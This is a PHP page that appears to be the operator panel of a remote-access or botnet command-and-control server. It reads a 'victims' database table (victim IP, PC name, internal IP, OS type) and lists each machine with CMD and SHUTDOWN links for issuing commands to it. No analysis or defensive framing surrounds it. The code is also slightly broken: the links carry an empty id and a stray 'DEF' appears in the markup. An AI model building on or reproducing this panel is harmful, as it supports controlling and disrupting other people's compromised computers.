<?php
include "include/logat.php";
include "include/connection.php";

$page = "cmd.php";

openBD();
$sql="SELECT id, ip_victim, name_pc, ip_intern, os_type FROM victims ORDER BY id";
$result = $conn->query($sql);
/*/echo "is running";*/
echo "";
echo "";
echo '<body style="background-color:gray;">';
echo '<h3><FONT COLOR="red">Victims:</h3>
		<div style="text-align:center;">
		<table border=\"2px\" width=\"80%\">
			<tr>
				<th><b><FONT COLOR="black">ID</b></th>
				<th><b><FONT COLOR="black">Ip Victim</b></th>
				<th><b><FONT COLOR="black">Pc Name</b></th>
				<th><b><FONT COLOR="black">Ip Intern</b></th>
				<th><b><FONT COLOR="black">OS Type</b></th>
				<th><FONT COLOR="black">COMMAND</th>
				<th><FONT COLOR="black">SHUTDOWN</th>
			</tr>';
	while($row = $result->fetch_assoc()){
		$id=$row["id"];
		$ip_victim=$row["ip_victim"];
		$name_pc=$row["name_pc"];
		$ip_intern=$row["ip_intern"];
		$os_type=$row["os_type"];
		echo"<tr>
			<td><FONT COLOR=\"lime\">$id</td>
			<td><FONT COLOR=\"lime\">$ip_victim</td>
			<td><FONT COLOR=\"lime\">$name_pc</td>
			<td><FONT COLOR=\"lime\">$ip_intern</td>
			<td><FONT COLOR=\"lime\">$os_type</td>
			<td><a href=\"$page?id=\">CMD</a></td>
			<td><a href=\"$page?id=\">SHUTDOWN</a></td>DEF
		</tr>";
	}
	closeBD();
	echo "
	</table>
	</div>
	</body>
	</html>";

?>
